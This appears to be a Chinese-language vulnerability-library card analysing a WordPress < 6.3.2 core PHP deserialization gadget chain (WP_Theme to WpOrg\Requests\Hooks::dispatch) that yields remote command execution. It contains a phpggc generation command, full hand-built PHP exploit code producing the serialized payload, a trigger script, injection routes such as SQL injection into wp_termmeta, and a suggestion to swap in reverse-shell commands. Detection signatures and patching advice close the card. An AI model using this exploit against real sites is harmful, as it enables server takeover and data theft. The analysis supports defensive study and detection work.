---
id: web-php-deserialization-wordpress-core-gadget-chain-wp-theme-hooks-dispatch
title: WordPress < 6.3.2 核心反序列化链：WP_Theme::__toString → WP_Block → Session → Hooks::dispatch 可变函数 RCE
type: scenario
domain: web
path: web/php/deserialization
technique: wordpress-core-unserialize-gadget-chain-wp-theme-hooks-dispatch
aliases:
- WordPress 反序列化链
- WordPress/RCE1
- phpggc WordPress RCE
- WP_Theme __toString gadget
- WP_Block_List offsetGet
- WpOrg\Requests\Hooks dispatch 可变函数
- maybe_unserialize RCE
affected_versions: WordPress < 6.3.2
tags:
- php
- wordpress
- deserialization
- gadget-chain
- phpggc
- rce
- arrayaccess
- magic-method
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V553
  verified_at: '2026-11-11T23:10:05+08:00'
  notes: 已对照原文与 13 张截图核对：原文“描述”节明确写 WordPress < 6.3.2，affected_versions 有依据；图 01 为 phpggc WordPress/RCE1 system whoami -u 输出；图 03-12 调试各跳（WP_Theme::get/display/offsetGet、WP_Block_List::offsetGet、WP_Block::__construct、WP_Block_Type_Registry::get_registered、Session::request、Requests::request 首层 dispatch、Hooks::dispatch 二层 callback=system、parameters=[whoami]）与卡片链一致；图 13 maybe_unserialize 20 处/12 文件与触发面描述一致。图 02 为 Session 未正确串联时 cURL error 3 的 __toString 异常截图，原文未贴最终 RCE 输出，卡内 confidence medium 标注合理（hook 在传输前执行，断点已命中 system 调用）。dedup 候选为通用 PHP POP 教学卡与 WordPress 插件漏洞卡，无 WordPress 核心 gadget 链同链，dup-scan 无涉及 pair。未验证点：未在本机复现 RCE 输出。
---

## 一句话结论

WordPress < 6.3.2 核心存在一条完整的 PHP 反序列化 gadget 链：反序列化出的 `WP_Theme` 对象被 `echo`/字符串化时触发 `__toString()` → `display('Name')` → `get('Name')` → 访问被替换成 `WP_Block_List`（ArrayAccess）的 `headers['Name']` → 构造 `WP_Block` → `WP_Block_Type_Registry::get_registered()` → 再访问被替换成 `WP_Theme` 的 `registered_block_types['Parent Theme']` → `offsetGet` 取 `parent()->get('Name')`（`WpOrg\Requests\Session`）→ `Requests::request()` → `$options['hooks']->dispatch('requests.before_request', [...])`（`WpOrg\Requests\Hooks`）→ 二层 `dispatch` 用可控的 `$this->hooks[$url]` 数组把 `system` 当回调、`whoami` 当参数执行，形成 RCE。

## 原理

- **入口魔术方法**：反序列化得到 `WP_Theme` 对象后，`echo $obj`（或任何字符串化操作）触发 `__toString()`：`return (string) $this->display('Name');`。
- **可控属性驱动的调用链**：`display()` 调 `get('Name')`，其中 `$this->headers[$header]` 是数组式访问；把 `headers` 属性换成实现了 `ArrayAccess` 的 `WP_Block_List`，即触发其 `offsetGet('Name')`。
- **继续衔接**：`WP_Block_List::offsetGet()` 在 `blocks['Name']` 是数组时 `new WP_Block($block, $context, $this->registry)`；`WP_Block::__construct` 调 `$registry->get_registered($this->name)`；`WP_Block_Type_Registry::get_registered()` 先 `is_registered($name)`（`isset($this->registered_block_types[$name])`），再把 `registered_block_types` 换成 `WP_Theme`（同样 ArrayAccess）即可触发其 `offsetGet('Parent Theme')`。
- **进入 Requests**：`WP_Theme::offsetGet('Parent Theme')` 走 `$this->parent()->get('Name')`；把 `parent` 属性换成 `WpOrg\Requests\Session`，其 `get($url, $headers, $options)` → `request()` → `Requests::request($url, $headers, $data, $type, $options)`。
- **可变函数终点**：`Requests::request()` 执行 `$options['hooks']->dispatch('requests.before_request', [&$url, &$headers, &$data, &$type, &$options])`。把 `$options['hooks']` 换成 `WpOrg\Requests\Hooks`，其 `dispatch($hook, $parameters)` 遍历 `$this->hooks[$hook]` 并 `$callback(...$parameters)`。
- **两层 dispatch**：第一层 `hooks['requests.before_request'][0][0] = [Hooks_instance, 'dispatch']`，回调再次进入 `dispatch($url, $headers)`（后三个参数不用）；此时 `$hook = $url = "http://p:0/Name"`，第二层 Hooks 的 `hooks["http://p:0/Name"] = [["system"]]`、`$parameters = $headers = ["whoami"]`，于是执行 `system('whoami')`——利用的是 PHP "数组可调用 + 可变参数"把任意函数名当回调。
- **为什么成立**：每个跳转点都用"属性可控 + 魔术方法/ArrayAccess 自动触发"把数据流引向下一个类的方法；最终 `Hooks::dispatch` 的可变函数调用没有任何回调白名单，`$callback` 与参数完全由反序列化数据控制。

## 触发条件

- WordPress < 6.3.2（官方后续版本移除了该链的利用条件）。
- 存在可触达的 `unserialize` 入口：WP 的 `maybe_unserialize()` 会把"看起来像序列化串"的数据反序列化，全项目约 20 处调用（option、postmeta/termmeta、settings 等）。
- 攻击者能把恶意序列化串写入这些数据源并让其被读取：例如通过 SQL 注入向 `wp_termmeta` 插入新行（WPScan 报告的场景），或把管理员用户名、站点名等设置成 payload；也可结合其它能写 option/meta 的漏洞。
- PHP 环境与 WP 版本包含上述类（`WpOrg\Requests` 随核心内置）；payload 需 URL 编码后在 `unserialize(urldecode($str))` 场景使用。

## 利用步骤

1. 用 PHPGGC 生成链（以执行 `whoami` 为例）：
   ```
   php phpggc WordPress/RCE1 system whoami -u
   ```
   输出即 URL 编码的序列化 payload（`WP_Theme` 对象，含 `WP_Block_List`、`WP_Block_Type_Registry`、`WpOrg\Requests\Session`、`WpOrg\Requests\Hooks` 等嵌套对象）。
2. 把 payload 注入可被 `maybe_unserialize()` 处理的数据：SQLi 写 `wp_termmeta`、修改管理员用户名/站点名/option 等。
3. 触发读取：访问对应页面/后台设置页，让 WP 取到该 meta/option 并 `maybe_unserialize`；若入口是 `echo`/字符串化，则 `WP_Theme::__toString` 被触发。
4. 命令在 `Hooks::dispatch` 的 `system(...)` 处执行；按需替换 `whoami` 为反弹 shell 或写文件命令。

## PoC

PHPGGC 生成命令：

```text
php phpggc WordPress/RCE1 system whoami -u
```

原文手工构造 EXP（与 phpggc 生成的链等价，序列化后 URL 编码）：

```php
namespace WpOrg\Requests {
    class Session {
        private $url; private $headers; private $options;
        public function __construct($url, $headers, $options) {
            $this->url = $url; $this->headers = $headers; $this->options = $options;
        }
    }
    class Hooks {
        public $hooks;
        public function __construct($hooks) { $this->hooks = $hooks; }
    }
}
namespace {
    use WpOrg\Requests\Hooks;
    use WpOrg\Requests\Session;

    class WP_Theme {
        private $headers; private $parent;
        public function __construct($headers, $parent) { $this->headers = $headers; $this->parent = $parent; }
    }
    class WP_Block_List {
        private $blocks; private $registry;
        public function __construct($blocks, $registry) { $this->blocks = $blocks; $this->registry = $registry; }
    }
    class WP_Block_Type_Registry {
        private $registered_block_types;
        public function __construct($r) { $this->registered_block_types = $r; }
    }

    $hooks = ["requests.before_request" => [[
        [new Hooks(["http://p:0/Name" => [["system"]]]), "dispatch"]
    ]]];
    $hook = new Hooks($hooks);
    $parent = new Session("http://p:0", ["whoami"], ["hooks" => $hook]);
    $registered_block_types = new WP_Theme(null, $parent);
    $blocks = ["Name" => ["blockName" => "Parent Theme"]];
    $registry = new WP_Block_Type_Registry($registered_block_types);
    $headers = new WP_Block_List($blocks, $registry);
    $theme = new WP_Theme($headers, null);
    echo urlencode(serialize($theme));
}
```

测试触发（需加载 WP 环境）：

```php
require_once __DIR__.'/wp-load.php';
wp();
$obj = unserialize(urldecode($payload));
echo $obj;   // 触发 __toString → 链 → system(whoami)
```

调用栈（原文调试）：

```text
Hooks->dispatch() ×2 → Requests::request() → Session->request() → Session->get()
→ WP_Theme->offsetGet() → WP_Block_Type_Registry->get_registered() → WP_Block->__construct()
→ WP_Block_List->offsetGet() → WP_Theme->get() → WP_Theme->display() → WP_Theme->__toString()
```

## 变体与关联

- **入口变体**：`maybe_unserialize`（option/meta/settings）、插件自定义 `unserialize($_POST/COOKIE)`、缓存/会话反序列化等；不同入口只影响 payload 的编码（URL 编码/原始串）。
- **命令变体**：`system` 回调可换 `exec`、`passthru`、`assert`（PHP<8）等；`$headers` 数组即参数列表，可传多参数。
- **同类 PHP 链**：库内已有 Laravel Reverb/Redis 反序列化、SimplePie memcache 注入、Roundcube session 注入等 PHP 反序列化卡；本卡补充 WordPress 核心链。PHPGGC 还提供多条 WordPress 链（不同版本/入口），利用前需按目标版本选择。
- **触发前置**：单独的反序列化链需要"可写入序列化数据的源"；SQLi 写 `wp_termmeta`、后台用户名/站点名可控是原文给出的两种现实路径。

## 检测与防御

- **升级**：升级到 WordPress 6.3.2 及以上（该链依赖的类关系/触发路径已被修复）。
- **代码层**：`maybe_unserialize` 使用 `unserialize($data, ['allowed_classes' => false])` 或白名单类；插件中避免对用户输入直接 `unserialize`。
- **阻断注入源**：修复 SQL 注入（`wp_termmeta` 写入）、限制管理员用户名/站点名可写入的内容、后台设置做输入校验。
- **检测**：数据库/请求中出现 `O:8:"WP_Theme"`、`WP_Block_List`、`WpOrg\Requests\Hooks` 等序列化类名；option/meta 值以 `O:`/`a:` 开头且含异常类；WAF 对 `unserialize` 入口与 cookie/post 中的序列化特征告警。

## 备注

- 原文为 WordPress 核心链分析，结尾称手工 EXP 与 phpggc payload 均能 RCE；调试截图完整展示了从 `__toString` 到 `Hooks::dispatch` 的调用栈与 `system('whoami')` 回调。原文测试截图中另有一张 `cURL error 3` 的 `__toString` 异常（payload 中 Session 未配好 hooks 时会尝试真实请求），不影响最终链成立，但原文未贴最终 RCE 输出截图，故 confidence 标 medium。
- `affected_versions` 按原文描述（WordPress < 6.3.2）填写；未验证具体修复 commit。
- 原文提到 `[$obj, "method"]()` 可变函数调用与 `callable` 数组是理解终点回调的关键前置知识。
